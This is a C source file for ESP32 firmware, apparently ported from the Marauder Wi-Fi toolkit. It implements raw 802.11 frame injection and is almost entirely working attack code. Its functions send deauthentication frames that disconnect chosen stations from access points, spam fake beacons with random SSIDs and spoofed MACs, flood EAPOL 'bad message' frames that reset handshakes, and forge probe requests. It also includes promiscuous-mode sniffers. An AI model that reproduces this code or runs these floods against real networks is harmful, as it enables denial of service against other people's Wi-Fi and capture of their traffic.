#include "wifi_attack.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_random.h"
#include "esp_timer.h"
#include "esp_mac.h"
#include "nvs_flash.h"
#include "esp_netif.h"
#include <string.h>
#include <stdio.h>

static const char *TAG = "wifi_attack";

/* ── esp_wifi_80211_tx is in libnet80211 but not in public headers ── */
esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

/* ── Dual-band channel table (2.4 + 5 GHz UNII-1/2/2e/3) ─────────── */
const uint8_t dual_band_channels[] = {
    1, 6, 11,                           /* 2.4 GHz */
    36, 40, 44, 48,                     /* UNII-1  */
    52, 56, 60, 64,                     /* UNII-2  */
    100, 104, 108, 112, 116, 120,       /* UNII-2e */
    124, 128, 132, 136, 140, 144,       /* UNII-2e */
    149, 153, 157, 161, 165             /* UNII-3  */
};
const uint8_t dual_band_channel_count = sizeof(dual_band_channels);

/* ── Module state ───────────────────────────────────────────────────── */
static bool     s_initialized  = false;
static bool     s_5ghz_enabled = false;
static uint32_t s_tx_count     = 0;
static uint32_t s_rx_count     = 0;
static uint8_t  s_channel      = 1;

/* ── 802.11 beacon frame template (ported from Marauder WiFiScan.h) ── */
/* FC=0x80 (beacon), Dur=0, DA=bcast, SA=placeholder, BSSID=placeholder */
static uint8_t s_beacon_pkt[128] = {
    0x80, 0x00, 0x00, 0x00,                         /* Frame Control, Duration */
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,             /* Destination (broadcast) */
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,             /* Source — overwritten    */
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,             /* BSSID  — overwritten    */
    0xc0, 0x6c,                                     /* Sequence control        */
    0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, /* Timestamp              */
    0x64, 0x00,                                     /* Beacon interval 100 TU  */
    0x31, 0x04,                                     /* Capability: ESS, ShortPreamble, Privacy */
    /* SSID IE tag (0x00) follows at offset 36 */
    0x00
};

/* Supported-rates IE appended after SSID */
static const uint8_t s_post_base[39] = {
    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
    0x03, 0x01, 0x04, 0x30, 0x18, 0x01, 0x00, 0x00, 0x0f, 0xac,
    0x02, 0x02, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac,
    0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00
};

/* Deauth frame template (FC=0xC0) */
static uint8_t s_deauth_pkt[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, /* DA  — broadcast or STA */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* SA  — BSSID           */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* BSSID                 */
    0xf0, 0xff,                          /* Seq control           */
    0x07, 0x00                           /* Reason: Class 3 frame */
};

/* EAPOL "bad message" frame (Msg2 with zeroed MIC, triggers handshake reset) */
static const uint8_t s_eapol_bad[153] = {
    0x08, 0x02, 0x00, 0x00,                         /* FC data, duration */
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,             /* DA  */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             /* SA  */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             /* BSSID */
    0x30, 0x00,                                     /* Seq */
    /* LLC / SNAP */
    0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e,
    /* 802.1X header: ver=2004, type=Key, len=117 */
    0x02, 0x03, 0x00, 0x75,
    /* EAPOL-Key: desc=2(AES), info=0x00CA, keylen=16 */
    0x02, 0x00, 0xca, 0x00, 0x10,
    /* Replay counter */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
    /* Nonce (32 bytes) */
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
    0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
    0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f,
    /* Key IV (16) */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    /* Key RSC (8) */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    /* Key ID (8) */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    /* Key MIC (16 — zeroed, bad msg) */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    /* Key Data Len + PMKID IE */
    0x00, 0x16,
    0xdd, 0x14, 0x00, 0x0f, 0xac, 0x04,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

/* Probe request template */
static uint8_t s_probe_pkt[128] = {
    0x40, 0x00, 0x00, 0x00,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, /* DA broadcast */
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, /* SA — random  */
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, /* BSSID bcast  */
    0x01, 0x00,                          /* Seq control  */
    0x00,                                /* SSID IE tag  */
    0x00                                 /* SSID len     */
};

/* ── Init / deinit ──────────────────────────────────────────────────── */

esp_err_t wifi_attack_init(void)
{
    if (s_initialized) return ESP_OK;

    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_ERROR_CHECK(esp_wifi_set_max_tx_power(82));

    s_initialized = true;
    ESP_LOGI(TAG, "WiFi attack module initialized");
    return ESP_OK;
}

esp_err_t wifi_attack_deinit(void)
{
    if (!s_initialized) return ESP_OK;
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_deinit();
    esp_netif_deinit();
    s_initialized = false;
    return ESP_OK;
}

/* ── Promiscuous mode ───────────────────────────────────────────────── */

esp_err_t wifi_attack_start_promiscuous(wifi_frame_cb_t cb)
{
    wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT |
                       WIFI_PROMIS_FILTER_MASK_DATA |
                       WIFI_PROMIS_FILTER_MASK_CTRL
    };
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_filter(&filt));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(cb));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
    return ESP_OK;
}

esp_err_t wifi_attack_stop_promiscuous(void)
{
    return esp_wifi_set_promiscuous(false);
}

/* ── Channel control ────────────────────────────────────────────────── */

esp_err_t wifi_attack_set_channel(uint8_t ch)
{
    esp_err_t ret;
    if (ch > 14) {
        /* 5 GHz — set secondary channel to none */
        ret = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    } else {
        ret = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    }
    if (ret == ESP_OK) s_channel = ch;
    return ret;
}

uint8_t wifi_attack_get_channel(void)
{
    return s_channel;
}

/* ── Deauth ─────────────────────────────────────────────────────────── */

esp_err_t wifi_attack_send_deauth(const uint8_t bssid[6], const uint8_t dst[6],
                                   uint8_t channel, uint8_t count)
{
    wifi_attack_set_channel(channel);

    uint8_t frame[sizeof(s_deauth_pkt)];
    memcpy(frame, s_deauth_pkt, sizeof(s_deauth_pkt));

    /* DA */
    memcpy(&frame[4], dst, 6);
    /* SA = BSSID */
    memcpy(&frame[10], bssid, 6);
    /* BSSID */
    memcpy(&frame[16], bssid, 6);

    for (uint8_t i = 0; i < count; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
        s_tx_count++;
    }
    return ESP_OK;
}

/* ── Beacon spam — fixed SSID ───────────────────────────────────────── */

esp_err_t wifi_attack_beacon_spam(const char *ssid, uint8_t channel, bool random_mac)
{
    wifi_attack_set_channel(channel);

    size_t ssid_len = strnlen(ssid, 32);
    int frame_len = 37 + sizeof(s_post_base) + ssid_len + 1;

    uint8_t frame[256] = {0};
    memcpy(frame, s_beacon_pkt, 37);

    /* Randomize or use real SRC MAC */
    if (random_mac) {
        uint32_t r1 = esp_random();
        uint32_t r2 = esp_random();
        frame[10] = frame[16] = (r1 & 0xFE) | 0x02; /* locally administered, unicast */
        frame[11] = frame[17] = (r1 >> 8) & 0xff;
        frame[12] = frame[18] = (r1 >> 16) & 0xff;
        frame[13] = frame[19] = (r1 >> 24) & 0xff;
        frame[14] = frame[20] = r2 & 0xff;
        frame[15] = frame[21] = (r2 >> 8) & 0xff;
    } else {
        esp_read_mac(&frame[10], ESP_MAC_WIFI_SOFTAP);
        memcpy(&frame[16], &frame[10], 6);
    }

    /* SSID IE */
    frame[36] = 0x00;  /* IE tag: SSID */
    frame[37] = (uint8_t)ssid_len;
    memcpy(&frame[38], ssid, ssid_len);

    /* DS parameter set (channel) */
    frame[38 + ssid_len] = 0x03;
    frame[39 + ssid_len] = 0x01;
    frame[40 + ssid_len] = channel;

    /* Supported rates */
    memcpy(&frame[41 + ssid_len], s_post_base, sizeof(s_post_base));

    for (int i = 0; i < 3; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, frame, frame_len, false);
        s_tx_count++;
    }
    return ESP_OK;
}

/* ── Beacon spam — random SSID ──────────────────────────────────────── */

esp_err_t wifi_attack_beacon_rand_ssid(uint8_t channel)
{
    static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-";
    uint8_t ssid_len = (esp_random() % 28) + 4;
    char ssid[33] = {0};
    for (uint8_t i = 0; i < ssid_len; i++)
        ssid[i] = charset[esp_random() % (sizeof(charset) - 1)];
    return wifi_attack_beacon_spam(ssid, channel, true);
}

/* ── EAPOL bad-message flood ────────────────────────────────────────── */

esp_err_t wifi_attack_send_eapol_bad(const uint8_t bssid[6], uint8_t channel)
{
    wifi_attack_set_channel(channel);

    uint8_t frame[sizeof(s_eapol_bad)];
    memcpy(frame, s_eapol_bad, sizeof(s_eapol_bad));
    memcpy(&frame[10], bssid, 6);
    memcpy(&frame[16], bssid, 6);

    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
    s_tx_count += 2;
    return ESP_OK;
}

/* ── Probe request ──────────────────────────────────────────────────── */

esp_err_t wifi_attack_probe_req(const char *ssid, uint8_t channel)
{
    wifi_attack_set_channel(channel);

    uint8_t frame[128] = {0};
    memcpy(frame, s_probe_pkt, 28);

    /* Random SRC MAC */
    uint32_t r = esp_random();
    frame[10] = (r & 0xFE) | 0x02;
    frame[11] = (r >> 8)  & 0xff;
    frame[12] = (r >> 16) & 0xff;
    frame[13] = (r >> 24) & 0xff;
    frame[14] = esp_random() & 0xff;
    frame[15] = esp_random() & 0xff;

    uint8_t ssid_len = (uint8_t)strnlen(ssid, 32);
    frame[24] = 0x00;           /* SSID IE tag */
    frame[25] = ssid_len;
    memcpy(&frame[26], ssid, ssid_len);

    int len = 26 + ssid_len;
    for (int i = 0; i < 3; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
        s_tx_count++;
    }
    return ESP_OK;
}

/* ── Promiscuous callbacks ──────────────────────────────────────────── */

void wifi_attack_beacon_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_MGMT) return;

    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    uint16_t fc = (frame[1] << 8) | frame[0];
    uint8_t subtype = (fc >> 4) & 0x0f;

    if (subtype != 8) return; /* 8 = beacon */

    s_rx_count++;

    int8_t   rssi    = pkt->rx_ctrl.rssi;
    uint8_t  channel = pkt->rx_ctrl.channel;
    const uint8_t *bssid = &frame[16];

    /* SSID is at offset 38 in beacon, preceded by SSID IE (tag=0, len) */
    uint8_t ssid_len = (frame[37] < 32) ? frame[37] : 32;
    char ssid[33] = {0};
    memcpy(ssid, &frame[38], ssid_len);
    ssid[ssid_len] = '\0';

    printf("BEACON  ch=%02d  rssi=%4d  bssid=%02x:%02x:%02x:%02x:%02x:%02x  ssid=%s\n",
           channel, rssi,
           bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
           ssid);
}

void wifi_attack_ap_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type == WIFI_PKT_MISC) return;

    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    s_rx_count++;

    printf("FRAME  type=%d  ch=%02d  rssi=%4d  len=%d\n",
           type, pkt->rx_ctrl.channel, pkt->rx_ctrl.rssi,
           pkt->rx_ctrl.sig_len);
}

/* ── Stats ──────────────────────────────────────────────────────────── */

uint32_t wifi_attack_packets_sent(void)   { return s_tx_count; }
uint32_t wifi_attack_packets_rx(void)     { return s_rx_count; }
void     wifi_attack_reset_stats(void)    { s_tx_count = s_rx_count = 0; }

/* ── 5 GHz ──────────────────────────────────────────────────────────── */

esp_err_t wifi_attack_enable_5ghz(bool enable)
{
#if CONFIG_ESP_WIFI_ENABLE_5G
    s_5ghz_enabled = enable;
    ESP_LOGI(TAG, "5 GHz %s", enable ? "enabled" : "disabled");
    return ESP_OK;
#else
    (void)enable;
    ESP_LOGW(TAG, "5 GHz not supported on this build");
    return ESP_ERR_NOT_SUPPORTED;
#endif
}

bool wifi_attack_has_5ghz(void)
{
#if CONFIG_ESP_WIFI_ENABLE_5G
    return true;
#else
    return false;
#endif
}
